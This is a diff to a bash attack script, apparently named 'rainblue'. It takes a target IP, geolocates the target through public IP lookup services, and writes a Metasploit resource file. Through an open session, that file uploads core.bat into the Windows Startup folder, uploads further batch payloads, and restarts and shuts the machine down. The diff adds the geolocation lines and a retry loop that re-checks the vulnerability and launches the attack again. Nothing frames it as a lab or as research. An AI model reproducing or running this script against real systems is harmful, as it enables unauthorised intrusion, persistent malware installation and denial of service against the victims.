@@ -7,8 +7,9 @@ sleep 2.4
 if [ $( figlet rainblue | wc -c ) -eq "0" ]; then   # REQUIREMENTS CHECK
    clear
    sleep 1
-   echo " Dependencied Not Installed , Performing Automatic Installation !"
-   apt install -y figlet
+   echo " Dependencies Not Installed , Performing Automatic Installation !"
+   sleep 3
+   apt install -y figlet curl
 else
    echo " Dependencies Satisfied !"
 fi
@@ -25,16 +26,21 @@ while [ $i -le 22 ]; do
 done
 echo -e "\t\t\t\t\t  By Khusi-docker & PhiVault" 
 echo -e "\t\t\t\t\t  GitHub Khusi-docker - \e[34mhttps://github.com/Khusi-docker\e[0m"
-echo -e "\t\t\t\t\t  GitHub PhiVault - \e[34mhttps://github.com/PhiVault\e[0m"
+echo -e "\t\t\t\t\t  GitHub PhiVault - \e[34mhttps://github.com/PhiVault\e[0m.  V1.2"
 
 read -p "Enter Target IP -> " tip
 read -p "Enter Your IP -> " vic
 sleep 1
 echo -e "\e[31m\nAnalzying Target"
-
 if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
    sleep 1
    echo -e "\nTarget Locked & Connected !\n\nChecking For RainBow MalWare\n"
+   ip=$( ping -c 1 $tip | grep PING | cut -d ' ' -f3 | tr -d '(',')' )
+   echo -e "Target Located In\e[32m$( curl -s ipinfo.io/$ip | grep "country" | cut -d ':' -f2 )\e[31mCounty\n"
+   echo -e "Target In\e[32m$( curl -s ipinfo.io/$ip | grep "city" | cut -d ':' -f2 )\e[31mCity\n"
+   echo -e "Target Current Region is\e[32m$( curl -s ipinfo.io/$ip | grep "region" | cut -d ':' -f2 )\n\e[31m"
+   echo -e "Here are Target Co-ords\e[32m$( curl -s ipinfo.io/$ip | grep "loc" | cut -d ':' -f2 )\n\e[31m"
+   echo -e "Target Organization Name -\e[32m $( curl -s https://ipwhois.app/json/$tip | cut -d ':' -f19 | cut -d ',' -f1 )\e[31m\n"
    if [ -f core.bat ]; then
       sleep 1
       echo -e "MalWare Arranged\n"
@@ -50,16 +56,30 @@ if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
          echo -e "sessions -i 1 -C cd C:/ProgramData/Microsoft/Windows/'Start Menu'/Programs/Startup" >> snakebow.rc
          echo -e "sessions -i 1 -C upload core.bat" >> snakebow.rc
          echo -e "sessions -i 1 -C cd ..\nsessions -i 1 -C upload cmd1.bat\nsessions -i 1 -C upload cmd2.bat\nsessions -i 1 -C upload cmd3.bat\nsessions -i 1 -C upload cmd4.bat\nsessions -i 1 -C upload cmd5.bat\nsessions -i 1 -C upload cmd6.bat\nsessions -i 1 -C upload cmd7.bat\nsessions -i 1 -C upload cmd8.bat\nsessions -i 1 -C upload cmd9.bat\nrestart\nshutdown\nsessions -k 1\nexit -y" >> snakebow.rc
+         sleep 2
          msfconsole -r snakebow.rc
-         echo -e "\n Please Wait , Monitoring Target Behaviour"
+         echo -e "\n Monitoring Target Behaviour , Please Wait!"
          sleep 11
          if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
-            echo -e "\n\e[34m Attack Completed < Target Down > \e[0m"
+            echo -e "\n\e[34m Attack Completed , Target Up \e[0m"
          else
-            echo -e "\n\e[34m Attack Completed , Target Up !\e[0m"
+            echo -e "\n\e[34m Attack Completed , < Target Down > !\e[0m"
          fi
       else
-         echo -e "\nSorry The Target is Patched !"
+         echo -e "\nAttack Failed ! \n\n\e[32m Reattempting , Please Wait\n\e[31m"
+         vcheck=$( msfconsole -q -r vuln.rc | grep -o "WIN" | wc -c ) 
+         if [ $vcheck -eq "4" ]; then
+             msfconsole -r snakebow.rc
+             echo -e "\n Monitoring Target Behaviour , Please Wait!"
+             sleep 11
+             if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
+                echo -e "\n\e[34m Attack Completed , Target Up \e[0m"
+             else
+                echo -e "\n\e[34m Attack Completed , < Target Down > !\e[0m"
+             fi
+         else
+             echo -e "\n Attack Failed !"
+         fi
       fi
    else
       sleep 1
@@ -67,6 +87,6 @@ if [ $( ping -c 1 $tip | grep "1 received" | wc -c ) -eq "60" ]; then
    fi
 else
    sleep 1
-   echo "Target Seem Down , Try Again Later !"
+   echo "Target Unreachable , Try Again Later !"
 fi
 echo -e "\e[0m"
